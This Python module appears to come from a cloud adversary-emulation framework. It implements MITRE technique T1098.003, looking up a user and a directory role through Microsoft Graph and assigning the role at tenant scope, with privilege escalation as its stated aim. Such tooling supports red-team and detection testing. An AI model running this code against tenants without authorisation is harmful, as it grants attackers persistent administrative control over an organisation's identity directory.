from ..base_technique import BaseTechnique, ExecutionStatus, MitreTechnique
from ..technique_registry import TechniqueRegistry
from typing import Dict, Any, Tuple
from core.entra.graph_request import GraphRequest

@TechniqueRegistry.register
class EntraAssignDirectoryRole(BaseTechnique):
    def __init__(self):
        mitre_techniques = [
            MitreTechnique(
                technique_id="T1098.003",
                technique_name="Account Manipulation",
                tactics=["Persistence", "Privilege Escalation"],
                sub_technique_name="Additional Cloud Roles"
            )
        ]
        
        super().__init__("Assign Directory Role", "Assign a directory role to a user to perform privilege escalation", mitre_techniques)

    def execute(self, **kwargs: Any) -> Tuple[ExecutionStatus, Dict[str, Any]]:
        self.validate_parameters(kwargs)
        
        try:
            user_id: str = kwargs.get('user_id', None)
            role_id: str = kwargs.get('role_id', None)
            
            if user_id in [None, ""] or role_id in [None, ""]:
                return ExecutionStatus.FAILURE, {
                    "error": "Invalid Technique Input",
                    "message": "Invalid Technique Input"
                }
            
            # Get user info
            if GraphRequest().check_guid(user_id) == False:
                # Get user guid if upn provided in input
                user_string = user_id
                user_endpoint_url = 'https://graph.microsoft.com/v1.0/users'
                params = {
                    '$filter': f'userPrincipalName eq \'{user_string}\''
                }

                user_recon_response = GraphRequest().get(user_endpoint_url, params=params)
                if 'error' in user_recon_response:
                    # Graph request failed
                    return ExecutionStatus.FAILURE, {
                        "error": {
                            "error_code" :user_recon_response.get('error').get('code'),
                            "error_detail" : user_recon_response.get('error').get('message')
                        },
                        "message": "Failed to get user details"
                    }
                
                # Get user_id and user_upn
                for user in user_recon_response:
                    user_id = user['id']
                    user_upn = user['userPrincipalName']
            
            else:
                # Get additional user info if user id provided in input
                user_endpoint_url = f"https://graph.microsoft.com/v1.0/users/{user_id}"
                user_recon_response = GraphRequest().get(user_endpoint_url)
                if 'error' in user_recon_response:
                    # Graph request failed
                    return ExecutionStatus.FAILURE, {
                        "error": {
                            "error_code" :user_recon_response.get('error').get('code'),
                            "error_detail" : user_recon_response.get('error').get('message')
                        },
                        "message": "Failed to get user details"
                    }
                
                # get user_id and user_upn
                user_id = user_recon_response['id']
                user_upn = user_recon_response['userPrincipalName']

            # get role info
            if GraphRequest().check_guid(role_id) == False:
                # get role guid if role name provided in input
                role_string = role_id
                role_endpoint_url = 'https://graph.microsoft.com/v1.0/directoryRoles'
                params = {
                    '$filter': f'displayName eq \'{role_string}\''
                }

                role_recon_response = GraphRequest().get(role_endpoint_url, params=params)
                if 'error' in role_recon_response:
                    # graph request failed
                    return ExecutionStatus.FAILURE, {
                        "error": {
                            "error_code" :role_recon_response.get('error').get('code'),
                            "error_detail" : role_recon_response.get('error').get('message')
                        },
                        "message": "Failed to get role details"
                    }
                
                # get role_id and role_display_name
                for role in role_recon_response:
                    role_id = role['id']
                    role_template_id = role['roleTemplateId']
                    role_display_name = role['displayName']

            else:
                # get additional role info if role id or role template id provided in input
                role_endpoint_url = 'https://graph.microsoft.com/v1.0/directoryRoles'
                params = {
                    '$filter': f'roleTemplateId eq \'{role_id}\''
                }

                # attempt recon if input is role id        
                role_recon_response = GraphRequest().get(role_endpoint_url, params=params)
                if 'error' in role_recon_response:
                    # graph request failed
                    params = {
                        '$filter': f'id eq \'{role_id}\''
                    }
                    # attempt recon if input is role template id
                    role_recon_response = GraphRequest().get(role_endpoint_url, params=params)
                    if 'error' in role_recon_response:
                        # graph request failed
                        return ExecutionStatus.FAILURE, {
                            "error": {
                                "error_code" :role_recon_response.get('error').get('code'),
                                "error_detail" : role_recon_response.get('error').get('message')
                            },
                            "message": "Failed to get role details"
                        }
                
                # Get role_id and role_display_name
                for role in role_recon_response:
                    role_id = role['id']
                    role_template_id = role['roleTemplateId']
                    role_display_name = role['displayName']

            # Attempt role assignment
            endpoint_url = 'https://graph.microsoft.com/v1.0/roleManagement/directory/roleAssignments'

            
            # Create request payload
            data = {
                "@odata.type": "#microsoft.graph.unifiedRoleAssignment",
                "principalId": user_id,
                "roleDefinitionId": role_id,
                "directoryScopeId": "/"
            }
            
            raw_response = GraphRequest().post(url = endpoint_url, data = data)

            # Request successfull
            if 200 <= raw_response.status_code < 300:
                return ExecutionStatus.SUCCESS, {
                    "message": f"Successfully assigned role - {role_display_name} to user - {user_upn}",
                    "value": {
                        'role_assigned' : True,
                        'upn' : user_upn,
                        'user_id' : user_id,
                        'role_name' : role_display_name,
                        'role_id' : role_id,
                        'role_template_id' : role_template_id
                    }
                }
            
            # Request failed
            return ExecutionStatus.FAILURE, {
                "error": {"error_code" : raw_response.json().get('error').get('code', 'N/A'), 
                        "error_message" :raw_response.json().get('error').get('message', 'N/A')
                    },
                "message": "Failed to assign role to user"
            }

        except Exception as e:
            return ExecutionStatus.FAILURE, {
                "error": str(e),
                "message": "Failed to assign role to user"
            }

    def get_parameters(self) -> Dict[str, Dict[str, Any]]:
        return {
            "user_id": {"type": "str", "required": True, "default":None, "name": "User Name or Object ID", "input_field_type" : "text"},
            "role_id": {"type": "str", "required": True, "default":None, "name": "Role Name or Object ID", "input_field_type" : "text"}
        }